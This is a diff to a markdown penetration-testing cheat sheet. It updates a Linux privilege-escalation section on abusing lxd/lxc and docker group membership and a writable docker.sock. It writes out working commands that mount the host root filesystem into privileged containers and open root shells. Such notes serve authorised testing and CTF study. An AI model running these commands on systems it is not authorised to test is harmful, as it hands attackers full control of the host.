@@ -870,7 +870,7 @@ kali@kali:sudo machinectl remove MACHINE_NAME
 ```
 ### Priviledged Groups
 https://www.drakeaxelrod.com/notes/linux/privileged-groups
-###### lxd | lxc group
+###### Abusing lxd | lxc group
 First we need to have container images
 ```
 lxc image import ubuntu-template.tar.xz --alias ubuntutemp
@@ -880,17 +880,23 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 lxc start privesc
 lxc exec privesc /bin/bash | lxc exec privesc /bin/sh
 ```
-###### docker group
-if no docker in linux
+###### Abusing docker group
 ```
-wget https://master.dockerproject.com/linux/x86_64/docker -O docker
+if no docker in linux: wget https://master.dockerproject.com/linux/x86_64/docker -O docker
 ```
-Find docker.sock
 ```
 /tmp/docker -H unix:///app/docker.sock(docker.sock file path) ps
 /tmp/docker -H unix:///app/docker.sock(docker.sock file path) run --rm -d --privileged -v /:/hostsystem main_app(image name)
 /tmp/docker -H unix:///app/docker.sock(docker.sock file path) ps
 /tmp/docker -H unix:///app/docker.sock(docker.sock file path) exec -it 7ae3bcc818af(new container id) /bin/bash
+```
+Abusing writable docker.sock file when current user not in root or docker group but still have write permission over docker.sock
+```
+docker image ls
+REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
+ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
+
+docker -H unix:///var/run/docker.sock(docker.sock file path) run -v /:/mnt --rm -it ubuntu(REPOSITORY name) chroot /mnt bash
 ```
 ### Abusing Capability  
 | Capability | Description |
